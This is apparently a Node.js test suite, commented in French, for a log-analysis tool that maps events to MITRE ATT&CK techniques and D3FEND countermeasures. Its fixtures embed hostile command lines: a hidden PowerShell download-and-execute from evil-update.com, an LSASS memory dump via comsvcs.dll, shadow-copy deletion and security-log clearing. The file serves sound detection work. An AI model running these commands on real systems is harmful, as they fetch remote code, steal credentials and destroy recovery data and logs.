import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { analyze, prioritize, extractIOC, overallLevel, authFindings, isPrivateIp, attackUrl, d3Url, toEvents } from '../src/engine.js';
import { reportMD, navigatorLayer } from '../src/exports.js';
import { buildPrompt, MAX_CHARS } from '../src/prompt.js';

const sample = name => fs.readFileSync(new URL(`../samples/${name}.log`, import.meta.url), 'utf8');
const ids = res => res.list.map(f => f.id);

// Techniques que chaque scénario doit faire remonter (liste minimale, pas exhaustive).
const EXPECTED = {
  'windows-sysmon': ['T1204.002', 'T1059.001', 'T1105', 'T1036', 'T1053.005', 'T1482', 'T1003.001', 'T1021.002', 'T1569.002', 'T1560.001', 'T1567.002', 'T1070.001'],
  'linux-auth': ['T1110.003', 'T1078', 'T1548.003', 'T1136.001', 'T1098', 'T1053.003', 'T1059.004', 'T1496', 'T1003.008', 'T1070.003'],
  'web-access': ['T1595.002', 'T1190', 'T1505.003'],
  'ransomware': ['T1136.001', 'T1098', 'T1562.001', 'T1562.004', 'T1219', 'T1490', 'T1486', 'T1070.001'],
};

describe('exemples', () => {
  for (const [name, expected] of Object.entries(EXPECTED)) {
    test(`${name} : techniques attendues, niveau critique`, () => {
      const res = analyze(sample(name));
      for (const id of expected) assert.ok(ids(res).includes(id), `${id} manquante (trouvé : ${ids(res).join(' ')})`);
      assert.equal(overallLevel(res.list), 4);
    });
  }
  test('le n°1 D3FEND de l’intrusion Windows est Process Spawn Analysis', () => {
    assert.equal(prioritize(analyze(sample('windows-sysmon')).list)[0].k, 'PSA');
  });
});

describe('faux positifs', () => {
  test('activité normale : aucune détection', () => {
    const benign = [
      '2026-09-28 10:00:01 host=WKS-01 EventID=4624 LogonType=2 TargetUserName=alice',
      'Sep 28 10:01:00 srv sshd[1]: Accepted publickey for bob from 10.0.0.5 port 22',
      '127.0.0.1 - - [28/Sep/2026:10:02:00 +0200] "GET /index.html HTTP/1.1" 200 512',
      'Sep 28 10:03:00 srv CRON[2]: pam_unix(cron:session): session closed for user www-data',
    ].join('\n');
    assert.deepEqual(ids(analyze(benign)), []);
  });
  test('un motif de poids 0,5 seul ne déclenche rien', () => {
    assert.deepEqual(ids(analyze('EventID=1 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe')), []);
  });
  test('texte vide', () => {
    const res = analyze('');
    assert.deepEqual(res.list, []);
    assert.equal(overallLevel(res.list), 0);
  });
});

describe('score et confiance', () => {
  test('motif fort (poids 3) : confiance haute', () => {
    const f = analyze('cmd: vssadmin.exe delete shadows /all /quiet').list.find(x => x.id === 'T1490');
    assert.equal(f.conf, 3);
  });
  test('un même motif répété ne compte qu’une fois, bonus plafonné à 1', () => {
    const f = analyze(Array(10).fill('whoami').join('\n')).list.find(x => x.id === 'T1033');
    assert.equal(f.score, 2);
    assert.equal(f.ev.length, 10);
  });
  test('tri : sévérité puis confiance', () => {
    const list = analyze(sample('ransomware')).list;
    for (let i = 1; i < list.length; i++) {
      const a = list[i - 1], b = list[i];
      assert.ok(a.severity > b.severity || (a.severity === b.severity && a.conf >= b.conf), `${a.id} avant ${b.id}`);
    }
  });
});

describe('corrélation d’authentification', () => {
  const fail = (u, ip = '203.0.113.9') => `sshd[1]: Failed password for ${u} from ${ip} port 1 ssh2`;
  const ok = (u, ip = '203.0.113.9') => `sshd[1]: Accepted password for ${u} from ${ip} port 1 ssh2`;

  test('5 échecs sur 1 compte : brute force élevé', () => {
    const f = authFindings(Array(5).fill(fail('bob')));
    assert.equal(f.length, 1);
    assert.equal(f[0].id, 'T1110.001');
    assert.equal(f[0].severity, 3);
  });
  test('4 comptes différents : password spraying', () => {
    assert.deepEqual(authFindings(['admin', 'oracle', 'test', 'ubuntu'].map(u => fail(u))).map(f => f.id), ['T1110.003']);
  });
  test('2 échecs : signal faible seulement', () => {
    const f = authFindings([fail('bob'), fail('bob')]);
    assert.equal(f[0].severity, 1);
  });
  test('succès après 3 échecs depuis la même IP : Valid Accounts critique', () => {
    const f = authFindings([fail('bob'), fail('bob'), fail('bob'), ok('bob')]).find(x => x.id === 'T1078');
    assert.equal(f.severity, 4);
    assert.match(f.note, /bob/);
  });
  test('succès depuis une autre IP : pas de T1078', () => {
    const f = authFindings([fail('bob'), fail('bob'), fail('bob'), ok('bob', '10.1.1.1')]);
    assert.ok(!f.some(x => x.id === 'T1078'));
  });
  test('succès avant les échecs : pas de T1078', () => {
    const f = authFindings([ok('bob'), fail('bob'), fail('bob'), fail('bob')]);
    assert.ok(!f.some(x => x.id === 'T1078'));
  });
  test('EventLog Windows 4625 / 4624', () => {
    const lines = [
      ...['u1', 'u2', 'u3', 'u4', 'u5'].map(u => `EventID=4625 TargetUserName=${u} IpAddress=198.51.100.4`),
      'EventID=4624 LogonType=3 TargetUserName=u3 IpAddress=198.51.100.4',
    ];
    assert.deepEqual(authFindings(lines).map(f => f.id).sort(), ['T1078', 'T1110.003']);
  });
});

describe('priorisation D3FEND', () => {
  test('une contre-mesure citée par plusieurs techniques passe devant', () => {
    const list = [
      { id: 'A', severity: 3, conf: 3, d3fend: ['X', 'Y'] },
      { id: 'B', severity: 3, conf: 3, d3fend: ['Z', 'Y'] },
    ];
    const p = prioritize(list);
    assert.equal(p[0].k, 'Y');
    assert.deepEqual(p[0].techs, ['A', 'B']);
  });
  test('rang dans la liste : pénalité de 12 % par position', () => {
    const p = prioritize([{ id: 'A', severity: 4, conf: 3, d3fend: ['X', 'Y'] }]);
    assert.equal(p[0].score, 4);
    assert.ok(Math.abs(p[1].score - 3.52) < 1e-9);
  });
});

describe('indicateurs', () => {
  const ioc = extractIOC(sample('windows-sysmon'));
  test('IP, domaine, URL, hash, fichiers', () => {
    assert.ok(ioc.ips.includes('185.220.101.47'));
    assert.ok(ioc.doms.includes('cdn-update-check.xyz'));
    assert.ok(ioc.urls.includes('http://185.220.101.47/p/svchost.exe'));
    assert.equal(ioc.hashes.filter(h => h.length === 64).length, 1);
    assert.ok(ioc.files.includes('rclone.exe'));
  });
  test('un nom de fichier n’est pas un domaine', () => {
    assert.ok(!ioc.doms.some(d => d.endsWith('.exe')));
  });
  test('comptes extraits des logs sshd', () => {
    assert.ok(extractIOC(sample('linux-auth')).users.includes('deploy'));
  });
  test('IP internes', () => {
    for (const ip of ['10.2.3.4', '172.16.0.1', '172.31.255.1', '192.168.1.1', '127.0.0.1']) assert.ok(isPrivateIp(ip), ip);
    for (const ip of ['172.32.0.1', '8.8.8.8', '185.220.101.47']) assert.ok(!isPrivateIp(ip), ip);
  });
});

describe('liens', () => {
  test('ATT&CK', () => {
    assert.equal(attackUrl('T1059.001'), 'https://attack.mitre.org/techniques/T1059/001/');
    assert.equal(attackUrl('T1078'), 'https://attack.mitre.org/techniques/T1078/');
  });
  test('D3FEND', () => {
    assert.equal(d3Url('Process Spawn Analysis'), 'https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/');
  });
});

describe('exports', () => {
  const text = sample('windows-sysmon');
  const res = analyze(text);
  const state = { res, prio: prioritize(res.list), ioc: extractIOC(text) };
  test('rapport Markdown', () => {
    const md = reportMD(state, new Date('2026-09-28T09:00:00Z'));
    assert.match(md, /^# Triage ATT&CK/);
    assert.match(md, /\*\*Niveau global :\*\* Critique/);
    assert.match(md, /T1003\.001 LSASS Memory/);
    assert.match(md, /1\. \*\*D3-PSA Process Spawn Analysis\*\*/);
  });
  test('couche Navigator', () => {
    const layer = JSON.parse(navigatorLayer(state, new Date('2026-09-28T09:00:00Z')));
    assert.equal(layer.domain, 'enterprise-attack');
    assert.equal(layer.techniques.length, res.list.length);
    for (const t of layer.techniques) assert.ok(t.score >= 1 && t.score <= 4);
  });
});

describe('prompt Claude', () => {
  test('contient les détections locales et les logs', () => {
    const p = buildPrompt('ligne de log', [{ id: 'T1490', name: 'Inhibit System Recovery', severity: 4, conf: 3 }]);
    assert.match(p, /T1490 Inhibit System Recovery \(Critique, confiance haute\)/);
    assert.match(p, /<<<\nligne de log\n>>>/);
    assert.doesNotMatch(p, /tronqués/);
  });
  test('tronque au-delà de la limite et le signale', () => {
    const p = buildPrompt('x'.repeat(MAX_CHARS + 500), []);
    assert.match(p, /tronqués/);
    assert.ok(!p.includes('x'.repeat(MAX_CHARS + 1)));
  });
});

describe('formats sur plusieurs lignes', () => {
  const XML = `<Events>
<Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
  <System>
    <Provider Name="Microsoft-Windows-Sysmon"/>
    <EventID>1</EventID>
    <TimeCreated SystemTime="2026-09-29T09:41:12.123Z"/>
    <Computer>WIN-PC01.corp.local</Computer>
  </System>
  <EventData>
    <Data Name="Image">C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</Data>
    <Data Name="CommandLine">powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString(&apos;http://evil-update.com/a.ps1&apos;)</Data>
    <Data Name="ParentImage">C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE</Data>
  </EventData>
</Event>
<Event><System><EventID>1102</EventID><TimeCreated SystemTime="2026-09-29T09:45:20Z"/><Computer>WIN-PC01.corp.local</Computer></System></Event>
</Events>`;
  const ECS = JSON.stringify([{ '@timestamp': '2026-09-29T09:43:55Z', host: { name: 'WIN-PC01' }, event: { code: '1' },
    process: { command_line: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Users\\Public\\lsass.dmp full' } }], null, 2);

  test('export XML Windows : un événement par ligne, horodaté, entités décodées', () => {
    const e = toEvents(XML);
    assert.equal(e.format, 'XML Windows');
    assert.equal(e.lines.length, 2);
    assert.match(e.lines[0], /^2026-09-29T09:41:12\.123Z .*EventID=1 .*Computer=WIN-PC01\.corp\.local/);
    assert.match(e.lines[0], /DownloadString\('http/);
    assert.deepEqual(['T1070.001', 'T1204.002', 'T1059.001'].filter(id => !ids(analyze(XML)).includes(id)), []);
    assert.deepEqual(extractIOC(XML).hosts, ['WIN-PC01.corp.local']);
  });
  test('JSON indenté (ECS) : clés génériques gardent leur parent, alias Windows', () => {
    const e = toEvents(ECS);
    assert.equal(e.format, 'JSON');
    assert.match(e.lines[0], /^2026-09-29T09:43:55Z host=WIN-PC01 EventID=1 CommandLine="rundll32/);
    assert.ok(ids(analyze(ECS)).includes('T1003.001'));
  });
  test('JSONL : une ligne JSON aplatie par événement, backslashes décodés', () => {
    const e = toEvents('{"CommandLine":"wevtutil cl Security","Image":"C:\\\\Windows\\\\System32\\\\wevtutil.exe"}\n{"CommandLine":"whoami"}');
    assert.equal(e.format, 'JSONL');
    assert.equal(e.lines[0], 'CommandLine="wevtutil cl Security" Image=C:\\Windows\\System32\\wevtutil.exe');
  });
  test('texte brut inchangé, JSON invalide traité comme texte', () => {
    assert.equal(toEvents('a\nb').format, 'texte');
    assert.equal(toEvents('{pas du json').format, 'texte');
  });
  test('scénario de démo : attaque complète, niveau critique', () => {
    const res = analyze(sample('demo'));
    assert.ok(res.list.length >= 12, ids(res).join(' '));
    assert.equal(overallLevel(res.list), 4);
  });
});
